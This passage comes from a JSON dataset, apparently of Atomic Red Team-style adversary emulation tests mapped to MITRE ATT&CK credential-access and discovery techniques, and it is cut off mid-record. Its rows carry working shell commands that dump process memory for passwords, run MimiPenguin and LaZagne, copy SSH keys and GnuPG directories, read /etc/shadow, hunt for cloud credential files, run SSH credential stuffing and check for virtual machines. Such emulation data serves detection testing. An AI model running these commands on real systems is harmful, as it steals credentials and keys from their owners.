+"command": "sh #{script_path} && PID=$(pgrep -n -f \"#{pid_term}\") && MEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1) && MEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2) && MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START))) && dd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\" && strings \"#{output_file}\" | grep -i PASS",
+"row_index": 299,
+"sandbox": "1773616057_T1003.007_2_299",
+"tactic": "credential-access",
+"technique": "T1003.007",
+"test": "2",
+"test_name": "Dump individual process memory with sh on FreeBSD (Local)"
+},
+{
+"command": "sh #{script_path} && PID=$(pgrep -n -f \"#{pid_term}\") && PYTHON=$(which python || which python3 || which python2) && $PYTHON #{python_script} $PID #{output_file} && grep -i \"PASS\" \"#{output_file}\"",
+"row_index": 300,
+"sandbox": "1773616177_T1003.007_3_300",
+"tactic": "credential-access",
+"technique": "T1003.007",
+"test": "3",
+"test_name": "Dump individual process memory with Python (Local)"
+},
+{
+"command": "sudo #{MimiPenguin_Location} > #{output_file} && cat #{output_file}",
+"row_index": 301,
+"sandbox": "1773616297_T1003.007_4_301",
+"tactic": "credential-access",
+"technique": "T1003.007",
+"test": "4",
+"test_name": "Capture Passwords with MimiPenguin"
+},
+{
+"command": "tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}",
+"row_index": 302,
+"sandbox": "1773616417_T1040_1_302",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "1",
+"test_name": "Packet Capture Linux using tshark or tcpdump"
+},
+{
+"command": "tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}",
+"row_index": 303,
+"sandbox": "1773616538_T1040_2_303",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "2",
+"test_name": "Packet Capture FreeBSD using tshark or tcpdump"
+},
+{
+"command": "sudo #{program_path} -i #{ifname} -t 3",
+"row_index": 304,
+"sandbox": "1773616658_T1040_10_304",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "10",
+"test_name": "Packet Capture FreeBSD using /dev/bpfN with sudo"
+},
+{
+"command": "sudo #{program_path} -f -i #{ifname} -t 3",
+"row_index": 305,
+"sandbox": "1773616778_T1040_11_305",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "11",
+"test_name": "Filtered Packet Capture FreeBSD using /dev/bpfN with sudo"
+},
+{
+"command": "sudo #{program_path} -a -t 3",
+"row_index": 306,
+"sandbox": "1773616898_T1040_12_306",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "12",
+"test_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo"
+},
+{
+"command": "sudo #{program_path} -4 -p 6 -t 3",
+"row_index": 307,
+"sandbox": "1773617018_T1040_13_307",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "13",
+"test_name": "Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo"
+},
+{
+"command": "sudo #{program_path} -4 -P -p 17 -t 3",
+"row_index": 308,
+"sandbox": "1773617138_T1040_14_308",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "14",
+"test_name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo"
+},
+{
+"command": "sudo #{program_path} -a -f -t 3",
+"row_index": 309,
+"sandbox": "1773617258_T1040_15_309",
+"tactic": "credential-access",
+"technique": "T1040",
+"test": "15",
+"test_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo"
+},
+{
+"command": "export AWS_REGION=#{aws_region} && cd #{stratus_path} && echo \"starting warmup\" && ./stratus warmup aws.credential-access.ec2-get-password-data && echo \"starting detonate\" && ./stratus detonate aws.credential-access.ec2-get-password-data --force",
+"row_index": 310,
+"sandbox": "1773617378_T1552_1_310",
+"tactic": "credential-access",
+"technique": "T1552",
+"test": "1",
+"test_name": "AWS - Retrieve EC2 Password Data using stratus"
+},
+{
+"command": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}",
+"row_index": 311,
+"sandbox": "1773617498_T1555.003_9_311",
+"tactic": "credential-access",
+"technique": "T1555.003",
+"test": "9",
+"test_name": "LaZagne.py - Dump Credentials from Firefox Browser"
+},
+{
+"command": "find #{search_path} -name id_rsa 2>/dev/null >> #{output_file} && exit 0",
+"row_index": 312,
+"sandbox": "1773617619_T1552.004_2_312",
+"tactic": "credential-access",
+"technique": "T1552.004",
+"test": "2",
+"test_name": "Discover Private SSH Keys"
+},
+{
+"command": "mkdir #{output_folder} && find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\; && exit 0",
+"row_index": 313,
+"sandbox": "1773617739_T1552.004_3_313",
+"tactic": "credential-access",
+"technique": "T1552.004",
+"test": "3",
+"test_name": "Copy Private SSH Keys with CP"
+},
+{
+"command": "mkdir #{output_folder} && find #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \\;",
+"row_index": 314,
+"sandbox": "1773617859_T1552.004_4_314",
+"tactic": "credential-access",
+"technique": "T1552.004",
+"test": "4",
+"test_name": "Copy Private SSH Keys with CP (freebsd)"
+},
+{
+"command": "mkdir #{output_folder} && find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\; && exit 0",
+"row_index": 315,
+"sandbox": "1773617979_T1552.004_5_315",
+"tactic": "credential-access",
+"technique": "T1552.004",
+"test": "5",
+"test_name": "Copy Private SSH Keys with rsync"
+},
+{
+"command": "mkdir #{output_folder} && find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;",
+"row_index": 316,
+"sandbox": "1773618099_T1552.004_6_316",
+"tactic": "credential-access",
+"technique": "T1552.004",
+"test": "6",
+"test_name": "Copy Private SSH Keys with rsync (freebsd)"
+},
+{
+"command": "mkdir #{output_folder} && find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\; && exit 0",
+"row_index": 317,
+"sandbox": "1773618219_T1552.004_7_317",
+"tactic": "credential-access",
+"technique": "T1552.004",
+"test": "7",
+"test_name": "Copy the users GnuPG directory with rsync"
+},
+{
+"command": "mkdir #{output_folder} && find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;",
+"row_index": 318,
+"sandbox": "1773618339_T1552.004_8_318",
+"tactic": "credential-access",
+"technique": "T1552.004",
+"test": "8",
+"test_name": "Copy the users GnuPG directory with rsync (freebsd)"
+},
+{
+"command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}",
+"row_index": 319,
+"sandbox": "1773618459_T1552.003_1_319",
+"tactic": "credential-access",
+"technique": "T1552.003",
+"test": "1",
+"test_name": "Search Through Bash History"
+},
+{
+"command": "cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}",
+"row_index": 320,
+"sandbox": "1773618579_T1552.003_2_320",
+"tactic": "credential-access",
+"technique": "T1552.003",
+"test": "2",
+"test_name": "Search Through sh History"
+},
+{
+"command": "find #{file_path}/.aws -name \"credentials\" -type f 2>/dev/null",
+"row_index": 321,
+"sandbox": "1773618700_T1552.001_1_321",
+"tactic": "credential-access",
+"technique": "T1552.001",
+"test": "1",
+"test_name": "Find AWS credentials"
+},
+{
+"command": "grep -ri password #{file_path} && exit 0",
+"row_index": 322,
+"sandbox": "1773618820_T1552.001_3_322",
+"tactic": "credential-access",
+"technique": "T1552.001",
+"test": "3",
+"test_name": "Extract passwords with grep"
+},
+{
+"command": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done",
+"row_index": 323,
+"sandbox": "1773618940_T1552.001_6_323",
+"tactic": "credential-access",
+"technique": "T1552.001",
+"test": "6",
+"test_name": "Find and Access Github Credentials"
+},
+{
+"command": "find #{file_path}/.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null",
+"row_index": 324,
+"sandbox": "1773619060_T1552.001_15_324",
+"tactic": "credential-access",
+"technique": "T1552.001",
+"test": "15",
+"test_name": "Find Azure credentials"
+},
+{
+"command": "find #{file_path}/.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null",
+"row_index": 325,
+"sandbox": "1773619180_T1552.001_16_325",
+"tactic": "credential-access",
+"technique": "T1552.001",
+"test": "16",
+"test_name": "Find GCP credentials"
+},
+{
+"command": "find #{file_path}/.oci/sessions -name \"token\" -type f 2>/dev/null",
+"row_index": 326,
+"sandbox": "1773619300_T1552.001_17_326",
+"tactic": "credential-access",
+"technique": "T1552.001",
+"test": "17",
+"test_name": "Find OCI credentials"
+},
+{
+"command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/ && for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done",
+"row_index": 327,
+"sandbox": "1773619420_T1110.004_1_327",
+"tactic": "credential-access",
+"technique": "T1110.004",
+"test": "1",
+"test_name": "SSH Credential Stuffing From Linux"
+},
+{
+"command": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/ && for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done",
+"row_index": 328,
+"sandbox": "1773619540_T1110.004_3_328",
+"tactic": "credential-access",
+"technique": "T1110.004",
+"test": "3",
+"test_name": "SSH Credential Stuffing From FreeBSD"
+},
+{
+"command": "sudo cat /etc/shadow > #{output_file} && cat #{output_file}",
+"row_index": 329,
+"sandbox": "1773619661_T1003.008_1_329",
+"tactic": "credential-access",
+"technique": "T1003.008",
+"test": "1",
+"test_name": "Access /etc/shadow (Local)"
+},
+{
+"command": "sudo cat /etc/master.passwd > #{output_file} && cat #{output_file}",
+"row_index": 330,
+"sandbox": "1773619781_T1003.008_2_330",
+"tactic": "credential-access",
+"technique": "T1003.008",
+"test": "2",
+"test_name": "Access /etc/master.passwd (Local)"
+},
+{
+"command": "cat /etc/passwd > #{output_file} && cat #{output_file}",
+"row_index": 331,
+"sandbox": "1773619901_T1003.008_3_331",
+"tactic": "credential-access",
+"technique": "T1003.008",
+"test": "3",
+"test_name": "Access /etc/passwd (Local)"
+},
+{
+"command": "unamestr=$(uname) && if [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; fi",
+"row_index": 332,
+"sandbox": "1773620021_T1003.008_4_332",
+"tactic": "credential-access",
+"technique": "T1003.008",
+"test": "4",
+"test_name": "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat"
+},
+{
+"command": "testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) } && [ \"$(uname)\" = 'FreeBSD' ] && testcat /etc/master.passwd && testcat /etc/passwd && testcat /etc/shadow",
+"row_index": 333,
+"sandbox": "1773620141_T1003.008_5_333",
+"tactic": "credential-access",
+"technique": "T1003.008",
+"test": "5",
+"test_name": "Access /etc/{shadow,passwd,master.passwd} with shell builtins"
+},
+{
+"command": "users && w && who",
+"row_index": 334,
+"sandbox": "1773620261_T1033_2_334",
+"tactic": "discovery",
+"technique": "T1033",
+"test": "2",
+"test_name": "System Owner/User Discovery"
+},
+{
+"command": "ping -c 4 #{ping_target}",
+"row_index": 335,
+"sandbox": "1773620381_T1016.001_2_335",
+"tactic": "discovery",
+"technique": "T1016.001",
+"test": "2",
+"test_name": "Check internet connection using ping freebsd, linux or macos"
+},
+{
+"command": "lsmod",
+"row_index": 336,
+"sandbox": "1773620501_T1652_2_336",
+"tactic": "discovery",
+"technique": "T1652",
+"test": "2",
+"test_name": "Device Driver Discovery (Linux)"
+},
+{
+"command": "find /lib/modules/$(uname -r)/kernel/drivers -name \"*.ko*\"",
+"row_index": 337,
+"sandbox": "1773620621_T1652_3_337",
+"tactic": "discovery",
+"technique": "T1652",
+"test": "3",
+"test_name": "Enumerate Kernel Driver Files (Linux)"
+},
+{
+"command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn",
+"row_index": 338,
+"sandbox": "1773620742_T1087.002_23_338",
+"tactic": "discovery",
+"technique": "T1087.002",
+"test": "23",
+"test_name": "Active Directory Domain Search"
+},
+{
+"command": "ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087",
+"row_index": 339,
+"sandbox": "1773620862_T1087.002_24_339",
+"tactic": "discovery",
+"technique": "T1087.002",
+"test": "24",
+"test_name": "Account Enumeration with LDAPDomainDump"
+},
+{
+"command": "cat /etc/passwd > #{output_file} && cat #{output_file}",
+"row_index": 340,
+"sandbox": "1773620982_T1087.001_1_340",
+"tactic": "discovery",
+"technique": "T1087.001",
+"test": "1",
+"test_name": "Enumerate all accounts (Local)"
+},
+{
+"command": "if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi; && if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi; && cat #{output_file}",
+"row_index": 341,
+"sandbox": "1773621102_T1087.001_2_341",
+"tactic": "discovery",
+"technique": "T1087.001",
+"test": "2",
+"test_name": "View sudoers access"
+},
+{
+"command": "grep 'x:0:' /etc/passwd > #{output_file} && grep '*:0:' /etc/passwd >> #{output_file} && cat #{output_file} 2>/dev/null",
+"row_index": 342,
+"sandbox": "1773621222_T1087.001_3_342",
+"tactic": "discovery",
+"technique": "T1087.001",
+"test": "3",
+"test_name": "View accounts with UID 0"
+},
+{
+"command": "username=$(id -u -n) && lsof -u $username",
+"row_index": 343,
+"sandbox": "1773621342_T1087.001_4_343",
+"tactic": "discovery",
+"technique": "T1087.001",
+"test": "4",
+"test_name": "List opened files by user"
+},
+{
+"command": "[ \"$(uname)\" = 'FreeBSD' ] && cmd=\"lastlogin\" || cmd=\"lastlog\" && $cmd > #{output_file} && cat #{output_file}",
+"row_index": 344,
+"sandbox": "1773621462_T1087.001_5_344",
+"tactic": "discovery",
+"technique": "T1087.001",
+"test": "5",
+"test_name": "Show if a user account has ever logged in remotely"
+},
+{
+"command": "groups && id",
+"row_index": 345,
+"sandbox": "1773621582_T1087.001_6_345",
+"tactic": "discovery",
+"technique": "T1087.001",
+"test": "6",
+"test_name": "Enumerate users and groups"
+},
+{
+"command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; && if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;",
+"row_index": 346,
+"sandbox": "1773621702_T1497.001_1_346",
+"tactic": "discovery",
+"technique": "T1497.001",
+"test": "1",
+"test_name": "Detect Virtualization Environment (Linux)"
+},
+{
+"command": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi",
+"row_index": 347,
+"sandbox": "1773621823_T1497.001_2_347",
+"tactic": "discovery",
+"technique": "T1497.001",
+"test": "2",
+"test_name": "Detect Virtualization Environment (FreeBSD)"
+},
+{
+"command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" \"(objectClass=group)\" -s sub -a always -z 1000 dn",
+"row_index": 348,
+"sandbox": "1773621943_T1069.002_15_348",
+"tactic": "discovery",
+"technique": "T1069.002",
+"test": "15",
+"test_name": "Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS"
+},
+{
+"command": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;",
+"row_index": 349,
+"sandbox": "1773622063_T1007_3_349",
+"tactic": "discovery",
+"technique": "T1007",
+"test": "3",
+"test_name": "System Service Discovery - systemctl/service"
+},
+{
+"command": "echo \"[*] Listing SysV init scripts (/etc/init.d):\" && if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo \"/etc/init.d not present on this system\"; fi && echo && echo \"[*] Listing runlevel directories (/etc/rc*.d):\" && ls -ld /etc/rc*.d 2>/dev/null || echo \"No /etc/rc*.d directories found\"",
+"row_index": 350,
+"sandbox": "1773622183_T1007_8_350",
+"tactic": "discovery",
+"technique": "T1007",
+"test": "8",
+"test_name": "System Service Discovery - Linux init scripts"
+},
+{
+"command": "tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}",
+"row_index": 351,
+"sandbox": "1773622303_T1040_1_351",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "1",
+"test_name": "Packet Capture Linux using tshark or tcpdump"
+},
+{
+"command": "tcpdump -c 5 -nnni #{interface} && tshark -c 5 -i #{interface}",
+"row_index": 352,
+"sandbox": "1773622423_T1040_2_352",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "2",
+"test_name": "Packet Capture FreeBSD using tshark or tcpdump"
+},
+{
+"command": "sudo #{program_path} -i #{ifname} -t 3",
+"row_index": 353,
+"sandbox": "1773622543_T1040_10_353",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "10",
+"test_name": "Packet Capture FreeBSD using /dev/bpfN with sudo"
+},
+{
+"command": "sudo #{program_path} -f -i #{ifname} -t 3",
+"row_index": 354,
+"sandbox": "1773622663_T1040_11_354",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "11",
+"test_name": "Filtered Packet Capture FreeBSD using /dev/bpfN with sudo"
+},
+{
+"command": "sudo #{program_path} -a -t 3",
+"row_index": 355,
+"sandbox": "1773622783_T1040_12_355",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "12",
+"test_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo"
+},
+{
+"command": "sudo #{program_path} -4 -p 6 -t 3",
+"row_index": 356,
+"sandbox": "1773622904_T1040_13_356",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "13",
+"test_name": "Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo"
+},
+{
+"command": "sudo #{program_path} -4 -P -p 17 -t 3",
+"row_index": 357,
+"sandbox": "1773623024_T1040_14_357",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "14",
+"test_name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo"
+},
+{
+"command": "sudo #{program_path} -a -f -t 3",
+"row_index": 358,
+"sandbox": "1773623144_T1040_15_358",
+"tactic": "discovery",
+"technique": "T1040",
+"test": "15",
+"test_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo"
+},
+{
+"command": "smbstatus --shares",
+"row_index": 359,
+"sandbox": "1773623264_T1135_2_359",
+"tactic": "discovery",
+"technique": "T1135",
+"test": "2",
+"test_name": "Network Share Discovery - linux"
+},
+{
+"command": "smbstatus --shares",
+"row_index": 360,
+"sandbox": "1773623384_T1135_3_360",
+"tactic": "discovery",
+"technique": "T1135",
+"test": "3",
+"test_name": "Network Share Discovery - FreeBSD"
+},
+{
+"command": "uname -a >> #{output_file} && if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi && if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi && if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi && if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi && uptime >> #{output_file} && cat #{output_file} 2>/dev/null",
+"row_index": 361,
+"sandbox": "1773623504_T1082_3_361",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "3",
+"test_name": "List OS Information"
+},
+{
+"command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi && if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi && if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi && if [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi && if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi && if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi && if [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi && if [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi",
+"row_index": 362,
+"sandbox": "1773623624_T1082_4_362",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "4",
+"test_name": "Linux VM Check via Hardware"
+},
+{
+"command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\" && sudo lsmod | grep -i \"vmw_baloon\\|vmxnet\" && sudo lsmod | grep -i \"xen-vbd\\|xen-vnif\" && sudo lsmod | grep -i \"virtio_pci\\|virtio_net\" && sudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"",
+"row_index": 363,
+"sandbox": "1773623744_T1082_5_363",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "5",
+"test_name": "Linux VM Check via Kernel Modules"
+},
+{
+"command": "kldstat | grep -i \"vmm\" && kldstat | grep -i \"vbox\"",
+"row_index": 364,
+"sandbox": "1773623864_T1082_6_364",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "6",
+"test_name": "FreeBSD VM Check via Kernel Modules"
+},
+{
+"command": "hostname",
+"row_index": 365,
+"sandbox": "1773623985_T1082_8_365",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "8",
+"test_name": "Hostname Discovery"
+},
+{
+"command": "env",
+"row_index": 366,
+"sandbox": "1773624105_T1082_12_366",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "12",
+"test_name": "Environment variables discovery on freebsd, macos and linux"
+},
+{
+"command": "lsmod && kmod list && grep vmw /proc/modules",
+"row_index": 367,
+"sandbox": "1773624225_T1082_25_367",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "25",
+"test_name": "Linux List Kernel Modules"
+},
+{
+"command": "kldstat && kldstat | grep vmm",
+"row_index": 368,
+"sandbox": "1773624345_T1082_26_368",
+"tactic": "discovery",
+"technique": "T1082",
+"test": "26",
+"test_name": "FreeBSD List Kernel Modules"
+},
+{
+"command": "ping -c #{ping_count} 8.8.8.8 > /dev/null && #{evil_command}",
+"row_index": 369,
+"sandbox": "1773624465_T1497.003_1_369",
+"tactic": "discovery",
+"technique": "T1497.003",
+"test": "1",
+"test_name": "Delay execution with ping"
+},
+{
+"command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\; && cat #{output_file} 2>/dev/null",
+"row_index": 370,
+"sandbox": "1773624585_T1217_1_370",
+"tactic": "discovery",
+"technique": "T1217",
+"test": "1",
+"test_name": "List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux"
+},
+{
+"command": "find / -path \"*/.config/chromium/*/Bookmarks\" -exec echo {} >> #{output_file} \\; && cat #{output_file} 2>/dev/null",
+"row_index": 371,
+"sandbox": "1773624705_T1217_4_371",
+"tactic": "discovery",
+"technique": "T1217",
+"test": "4",
+"test_name": "List Google Chromium Bookmark JSON Files on FreeBSD"
+},
+{
+"command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"netstat -Sp tcp\"; else cmd=\"netstat -ant\"; fi; && if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; && if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; && if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; && if [ -x \"$(command -v netstat)\" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;",
+"row_index": 372,
+"sandbox": "1773624825_T1016_3_372",
+"tactic": "discovery",
+"technique": "T1016",
+"test": "3",
+"test_name": "System Network Configuration Discovery"
+},
+{
+"command": "ls -a >> #{output_file} && if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi; && file */* *>> #{output_file} && cat #{output_file} 2>/dev/null && find . -type f && ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/' && locate * && which sh",
+"row_index": 373,
+"sandbox": "1773624945_T1083_3_373",
+"tactic": "discovery",
+"technique": "T1083",
+"test": "3",
+"test_name": "Nix File and Directory Discovery"
+},
+{
+"command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file} && if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi; && find . -type f -iname *.pdf >> #{output_file} && cat #{output_file} && find . -type f -name \".*\"",
+"row_index": 374,
+"sandbox": "1773625066_T1083_4_374",
+"tactic": "discovery",
+"technique": "T1083",
+"test": "4",
+"test_name": "Nix File and Directory Discovery 2"
+},
+{
+"command": "findmnt -t nfs",
+"row_index": 375,
+"sandbox": "1773625186_T1083_8_375",
+"tactic": "discovery",
+"technique": "T1083",
+"test": "8",
+"test_name": "Identifying Network Shares - Linux"
+},
+{
+"command": "if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi",
+"row_index": 376,
+"sandbox": "1773625306_T1049_4_376",
+"tactic": "discovery",
+"technique": "T1049",
+"test": "4",
+"test_name": "System Network Connections Discovery via ss or lsof (Linux/MacOS)"
+},
+{
+"command": "netstat && who -a",
+"row_index": 377,
+"sandbox": "1773625426_T1049_5_377",
+"tactic": "discovery",
+"technique": "T1049",
+"test": "5",
+"test_name": "System Network Connections Discovery FreeBSD, Linux & MacOS"
+},
+{
+"command": "sockstat -4 && sockstat -6 2>/dev/null || true && sockstat -l 2>/dev/null || true",
+"row_index": 378,
+"sandbox": "1773625546_T1049_6_378",
+"tactic": "discovery",
+"technique": "T1049",
+"test": "6",
+"test_name": "System Network Connections Discovery via sockstat (Linux, FreeBSD)"
+},
+{
+"command": "ps >> #{output_file} && ps aux >> #{output_file}",
+"row_index": 379,
+"sandbox": "1773625666_T1057_1_379",
+"tactic": "discovery",
+"technique": "T1057",
+"test": "1",
+"test_name": "Process Discovery - ps"
+},
+{
+"command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; && if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; && if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; && if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; && if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; && cat /etc/group",
+"row_index": 380,
+"sandbox": "1773625786_T1069.001_1_380",
+"tactic": "discovery",
+"technique": "T1069.001",
+"test": "1",
+"test_name": "Permission Groups Discovery (Local)"
+},
+{
+"command": "cat /etc/pam.d/common-password",
+"row_index": 381,
+"sandbox": "1773625906_T1201_1_381",
+"tactic": "discovery",
+"technique": "T1201",
+"test": "1",
+"test_name": "Examine password complexity policy - Ubuntu"
+},
+{
+"command": "cat /etc/pam.d/passwd",
+"row_index": 382,
+"sandbox": "1773626026_T1201_2_382",
+"tactic": "discovery",
+"technique": "T1201",
+"test": "2",
+"test_name": "Examine password complexity policy - FreeBSD"
+},
+{
+"command": "cat /etc/security/pwquality.conf",
+"row_index": 383,
+"sandbox": "1773626147_T1201_3_383",
+"tactic": "discovery",
+"technique": "T1201",
+"test": "3",
+"test_name": "Examine password complexity policy - CentOS/RHEL 7.x"
+},
+{
+"command": "cat /etc/pam.d/system-auth && cat /etc/security/pwquality.conf",
+"row_index": 384,
+"sandbox": "1773626267_T1201_4_384",
+"tactic": "discovery",
+"technique": "T1201",
+"test": "4",
+"test_name": "Examine password complexity policy - CentOS/RHEL 6.x"
+},
+{
+"command": "cat /etc/login.defs",
+"row_index": 385,
+"sandbox": "1773626387_T1201_5_385",
+"tactic": "discovery",
+"technique": "T1201",
+"test": "5",
+"test_name": "Examine password expiration policy - All Linux"
+},
+{
+"command": "locale",
+"row_index": 386,
+"sandbox": "1773626507_T1614.001_3_386",
+"tactic": "discovery",
+"technique": "T1614.001",
+"test": "3",
+"test_name": "Discover System Language with locale"
+},
+{
+"command": "localectl status",
+"row_index": 387,
+"sandbox": "1773626627_T1614.001_4_387",
+"tactic": "discovery",
+"technique": "T1614.001",
+"test": "4",
+"test_name": "Discover System Language with localectl"
+},
+{
+"command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale",
+"row_index": 388,
+"sandbox": "1773626747_T1614.001_5_388",
+"tactic": "discovery",
+"technique": "T1614.001",
+"test": "5",
+"test_name": "Discover System Language by locale file"
+},
+{
+"command": "env | grep LANG && printenv LANG && set | grep LANG",
+"row_index": 389,
